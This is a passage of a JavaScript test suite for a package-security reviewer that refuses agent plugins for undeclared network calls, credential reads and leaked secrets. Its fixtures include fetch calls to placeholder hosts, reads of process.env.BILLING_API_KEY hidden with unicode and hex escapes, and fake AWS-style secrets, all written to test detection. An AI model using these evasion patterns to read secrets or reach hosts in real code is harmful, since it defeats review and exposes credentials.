      p["agent-descriptor.json"].systems.push({ name: `${secret}${"A".repeat(20)}" ${secret}${"B".repeat(20)}"`, access: "read", needs: "x" });
    }, ["A".repeat(20), "B".repeat(20)]],
  ];
  for (const [label, change, hidden] of cases) {
    const p = basePackage();
    change(p);
    const { answer, stdout } = review(p);
    assert.equal(answer?.result, "refused", label);
    for (const h of hidden) assert.ok(!stdout.toLowerCase().includes(h.toLowerCase()), `${label}: no ${JSON.stringify(h)} in ${stdout.slice(0, 400)}`);
  }
});

test("SR-15 lists unreadable and spend-limit together for a missing package directory and no spending limit", () => {
  const dir = join(AGENT, "test", "no-such-package");
  const owners = [{}, undefined, { spend_limit: { ...LIMIT, most_micro: -1 }, ceilings: [] }];
  for (const owner of owners) {
    const req = request(dir, owner);
    if (owner === undefined) delete req.owner;
    const { answer } = run(req);
    const label = JSON.stringify(owner ?? "no owner");
    assert.equal(answer?.result, "refused", label);
    assert.deepEqual(rules(answer).sort(), ["spend-limit", "unreadable"], label);
    for (const r of answer.refusals) assert.ok(typeof r.why === "string" && r.why.trim(), `${label}: ${r.rule} says why`);
  }
});

test("SR-16 lists in never each non-blank line of a string of refusals, or each non-blank string entry of an array, then the fixed refusal", () => {
  const a = "Writing to the ticket store.";
  const b = "Summarizing a ticket it was not handed.";
  const tail = "reach any destination outside the systems in reaches";
  const cases = [
    [[a, 5, b], [a, b, tail]],
    [[a, "", "  ", { text: "x" }, null, b], [a, b, tail]],
    [`${a}\n\n${b}\n`, [a, b, tail]],
    ["\n  \n", [tail]],
    [undefined, [tail]],
    [5, [tail]],
  ];
  for (const [refusals, never] of cases) {
    const p = basePackage();
    if (refusals === undefined) delete p["agent-descriptor.json"].refusals;
    else p["agent-descriptor.json"].refusals = refusals;
    const { answer } = review(p);
    const label = JSON.stringify(refusals ?? "no refusals");
    assert.equal(answer?.result, "passed", `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
    assert.deepEqual(answer.statement.never, never, label);
  }
});

test("SR-19 names the package by plugin.json's name and version where each is a non-blank string, and by the directory's name and agent_version member by member otherwise", () => {
  const cases = [
    [{ name: "ticket-tool", version: "2.0.0" }, "ticket-tool", "2.0.0"],
    [null, "ticket-dir", "0.1.0"],
    ["null\n", "ticket-dir", "0.1.0"],
    ["{ not json\n", "ticket-dir", "0.1.0"],
    ["[]\n", "ticket-dir", "0.1.0"],
    [{ version: "2.0.0" }, "ticket-dir", "2.0.0"],
    [{ name: "  ", version: "2.0.0" }, "ticket-dir", "2.0.0"],
    [{ name: "ticket-tool" }, "ticket-tool", "0.1.0"],
    [{ name: "ticket-tool", version: " " }, "ticket-tool", "0.1.0"],
    [{ name: 5, version: 2 }, "ticket-dir", "0.1.0"],
  ];
  for (const [plugin, name, version] of cases) {
    const p = basePackage();
    p["plugin.json"] = plugin;
    const dir = writePackage(p, "ticket-dir");
    const { answer } = run(request(dir));
    const label = JSON.stringify(plugin);
    assert.equal(answer?.result, "passed", `${label}: ${JSON.stringify(answer?.refusals ?? null)}`);
    assert.deepEqual(answer.statement.package, { name, version, digest: expectedDigest(dir) }, label);
  }
});


// Spec 0.3.0: what the reopen's review found (round 13).

test("SR-01 answers for a program with thousands of uncertain points, as one JSON object", () => {
  const p = basePackage();
  p["skills/read-tickets/scripts/big.js"] = Array.from({ length: 4000 }, (_, k) => `function f${k}() {}\n/x/;\n`).join("");
  const r = review(p);
  assert.equal(r.status, 0, r.stderr.slice(0, 300));
  assert.equal(r.answer?.result, "passed", JSON.stringify(r.answer?.refusals ?? null));
});

test("SR-05 reads a current declaration name alone, refusing one that does not parse even beside a readable former name", () => {
  for (const [current, former] of [["agent-descriptor.json", "descriptor.json"], ["agent-runtime-requirements.json", "install.json"]]) {
    for (const broken of ["{ not json\n", "[]\n"]) {
      const p = basePackage();
      p[former] = p[current];
      p[current] = broken;
      const { answer } = review(p);
      assert.deepEqual(rules(answer), ["unreadable"], `${current} ${JSON.stringify(broken)} beside ${former}`);
    }
  }
});

test("SR-08 refuses a URL in a .mts, .cts or .pyw program, and in a shipped .mts file a module imports", () => {
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  p[`${dir}/a.mts`] = 'export const a = "x";\nfetch("https://mts.example/");\n';
  p[`${dir}/b.cts`] = 'fetch("https://cts.example/");\n';
  p[`${dir}/c.pyw`] = 'import urllib.request\nurllib.request.urlopen("https://pyw.example/")\n';
  p[`${dir}/m.mjs`] = 'import x from "./d.mts";\n';
  p[`${dir}/d.mts`] = 'fetch("https://imported.example/");\n';
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  for (const [host, file, line] of [["mts.example", "a.mts", 2], ["cts.example", "b.cts", 1], ["pyw.example", "c.pyw", 2], ["imported.example", "d.mts", 1]]) {
    const r = refusal(answer, "undeclared-reach", host);
    assert.ok(r, `${host}: ${JSON.stringify(answer.refusals)}`);
    assert.deepEqual([r.file, r.line], [`${dir}/${file}`, line], host);
  }
  assert.equal(rules(answer).filter((x) => x === "unread-code").length, 0, "a shipped .mts file is read, not unread code");
});

test("SR-09 refuses a credential-like read whose process or env is written with escapes or in parentheses", () => {
  const BS = "\\";
  const reads = [`${BS}u0070rocess.env.BILLING_API_KEY`, `process["e${BS}x6ev"].BILLING_API_KEY`, `process.${BS}u0065nv["BILLING_API_KEY"]`, "(process).env.BILLING_API_KEY"];
  const dir = "skills/read-tickets/scripts";
  const p = basePackage();
  reads.forEach((read, i) => { p[`${dir}/e${i}.mjs`] = `export const k = ${read};\n`; });
  const { answer } = review(p);
  assert.equal(answer?.result, "refused");
  reads.forEach((read, i) => {
    const r = (answer.refusals ?? []).find((x) => x.file === `${dir}/e${i}.mjs`);
    assert.deepEqual(r && [r.rule, r.system, r.line], ["undeclared-reach", "BILLING_API_KEY", 1], read);
  });
});

test("SR-13 withholds credentials that overlap or touch as one span, leaving no fragment of either", () => {
  const seed = ["S", "U", "QWERTYUIOPLKJHGFDSAZXCVBNM", "234567", "QWERTYUIOPLKJHGFDSAZXCVB"].join("");
  const assign = ["aws_secret", "_access_key="].join("");
  const p = basePackage();
  p["agent-descriptor.json"].systems.push({ name: `${assign}${"x".repeat(40)}${seed}`, access: "read", needs: "x" });
  p["references/a.txt"] = `${assign}${"x".repeat(40)}${seed.slice(0, 20)} end\n`;
  p["references/b.txt"] = `seed ${seed} end\n`;
  const { stdout, answer } = review(p);
  assert.equal(answer?.result, "refused");
  assert.ok(rules(answer).includes("systems-mismatch"), JSON.stringify(answer.refusals));
  for (const part of [seed.slice(0, 20), seed.slice(20), seed.slice(38)]) assert.ok(!stdout.toLowerCase().includes(part.toLowerCase()), `leaks ${part}`);
});

test("SR-01 answers for a program with a long run of space after a name, as one JSON object", () => {
  const p = basePackage();
  p["skills/read-tickets/scripts/space.mjs"] = `export const a = process${" ".repeat(200000)};\nexport const b = x${"\t".repeat(200000)};\n`;
  const r = review(p);
  assert.equal(r.status, 0, r.stderr.slice(0, 300));
  assert.equal(r.answer?.result, "passed", JSON.stringify(r.answer?.refusals ?? null));
});

test("SR-20 gives each example request in examples/requests the answer recorded for it in examples/answers", () => {
  const examples = join(AGENT, "..", "..", "examples");
  const names = readdirSync(join(examples, "requests")).filter((f) => f.endsWith(".json")).sort();
  assert.ok(names.length > 0, "examples/requests holds at least one request");
  for (const name of names) {
    const { status, answer } = run(readFileSync(join(examples, "requests", name), "utf8"));
    assert.equal(status, 0, name);
    assert.deepEqual(answer, JSON.parse(readFileSync(join(examples, "answers", name), "utf8")), `${name}: the answer differs from examples/answers/${name}`);
  }
});
